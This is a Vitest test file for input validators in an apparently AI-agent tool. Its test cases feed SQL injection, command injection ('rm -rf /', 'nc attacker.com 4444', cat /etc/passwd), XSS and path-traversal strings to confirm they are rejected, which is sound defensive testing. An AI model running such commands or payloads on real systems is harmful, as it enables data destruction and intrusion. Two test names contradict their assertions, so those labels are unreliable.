import { describe, it, expect, beforeEach } from 'vitest';
import { validateAgentName, validateCapabilities, validatePrompt } from '../../../src/utils/validators';

describe('InputValidator', () => {
  describe('validateAgentName', () => {
    it('should accept valid agent names', () => {
      expect(() => validateAgentName('my-agent')).not.toThrow();
      expect(() => validateAgentName('test_agent')).not.toThrow();
      expect(() => validateAgentName('agent123')).not.toThrow();
    });

    it('should reject empty names', () => {
      expect(() => validateAgentName('')).toThrow();
    });

    it('should reject names that are too long', () => {
      const longName = 'a'.repeat(300);
      expect(() => validateAgentName(longName)).toThrow();
    });

    it('should reject SQL injection attempts', () => {
      expect(() => validateAgentName("'; DROP TABLE agents; --")).toThrow();
      expect(() => validateAgentName('agent" OR "1"="1')).toThrow();
    });

    it('should reject command injection attempts', () => {
      expect(() => validateAgentName('agent; rm -rf /')).toThrow();
      expect(() => validateAgentName('agent && malicious-command')).toThrow();
    });

    it('should reject path traversal attempts', () => {
      expect(() => validateAgentName('../../../etc/passwd')).toThrow();
      expect(() => validateAgentName('..\\..\\windows\\system32')).toThrow();
    });

    it('should allow hyphens and underscores', () => {
      expect(() => validateAgentName('my-test_agent')).not.toThrow();
    });
  });

  describe('validateCapabilities', () => {
    it('should accept valid capabilities array', () => {
      expect(() =>
        validateCapabilities(['code-generation', 'code-review'])
      ).not.toThrow();
    });

    it('should accept empty capabilities array', () => {
      expect(() => validateCapabilities([])).not.toThrow();
    });

    it('should accept single capability', () => {
      expect(() => validateCapabilities(['testing'])).not.toThrow();
    });

    it('should reject invalid capability types', () => {
      expect(() => validateCapabilities('not-an-array')).toThrow();
    });

    it('should reject capabilities with special characters', () => {
      expect(() => validateCapabilities(['<script>alert(1)</script>'])).toThrow();
    });

    it('should reject excessively long capability lists', () => {
      const tooMany = new Array(1000).fill('capability');
      expect(() => validateCapabilities(tooMany)).toThrow();
    });
  });

  describe('validatePrompt', () => {
    it('should accept valid prompts', () => {
      expect(() =>
        validatePrompt('Generate a function to sort an array')
      ).not.toThrow();
    });

    it('should reject empty prompts', () => {
      expect(() => validatePrompt('')).toThrow();
    });

    it('should reject excessively long prompts', () => {
      const longPrompt = 'a'.repeat(100000);
      expect(() => validatePrompt(longPrompt)).toThrow();
    });

    it('should handle multi-line prompts', () => {
      const multiline = 'Line 1\nLine 2\nLine 3';
      expect(() => validatePrompt(multiline)).not.toThrow();
    });

    it('should reject prompts with dangerous patterns', () => {
      expect(() =>
        validatePrompt('DELETE FROM users;')
      ).not.toThrow(); // Prompts are meant to contain code
    });

    it('should allow special characters in prompts', () => {
      expect(() =>
        validatePrompt('Create a function: foo() => { return "bar"; }')
      ).not.toThrow();
    });
  });

  describe('SQL injection prevention', () => {
    it('should sanitize agent names from SQL injection', () => {
      const dangerous = "admin'; --";
      expect(() => validateAgentName(dangerous)).toThrow();
    });

    it('should reject UNION-based injection', () => {
      const injection = "agent' UNION SELECT * FROM agents; --";
      expect(() => validateAgentName(injection)).toThrow();
    });

    it('should reject boolean-based injection', () => {
      const injection = "' OR '1'='1";
      expect(() => validateAgentName(injection)).toThrow();
    });
  });

  describe('Command injection prevention', () => {
    it('should reject shell command injection', () => {
      expect(() => validateAgentName('agent; cat /etc/passwd')).toThrow();
    });

    it('should reject pipe-based injection', () => {
      expect(() => validateAgentName('agent | nc attacker.com 4444')).toThrow();
    });

    it('should reject backtick execution', () => {
      expect(() => validateAgentName('agent`whoami`')).toThrow();
    });

    it('should reject $() execution', () => {
      expect(() => validateAgentName('agent$(whoami)')).toThrow();
    });
  });

  describe('XSS prevention', () => {
    it('should reject script tags in agent name', () => {
      expect(() =>
        validateAgentName('<script>alert("xss")</script>')
      ).toThrow();
    });

    it('should reject event handlers', () => {
      expect(() =>
        validateAgentName('<img onload="alert(1)">')
      ).toThrow();
    });

    it('should reject JavaScript protocol', () => {
      expect(() => validateAgentName('javascript:alert(1)')).toThrow();
    });
  });

  describe('Path traversal prevention', () => {
    it('should reject relative path traversal', () => {
      expect(() => validateAgentName('../../../secret')).toThrow();
    });

    it('should reject absolute path references', () => {
      expect(() => validateAgentName('/etc/passwd')).toThrow();
    });

    it('should reject backslash traversal on Windows', () => {
      expect(() => validateAgentName('..\\..\\windows\\system32')).toThrow();
    });

    it('should reject null byte injection', () => {
      expect(() => validateAgentName('agent\x00.js')).toThrow();
    });
  });

  describe('Unicode and encoding attacks', () => {
    it('should handle unicode characters safely', () => {
      expect(() => validateAgentName('agent-🚀')).not.toThrow();
    });

    it('should reject potential unicode bypasses', () => {
      // BOM and other encodings that could bypass checks
      const withBOM = '\uFEFFagent';
      expect(() => validateAgentName(withBOM)).not.toThrow(); // Trimmed
    });
  });
});
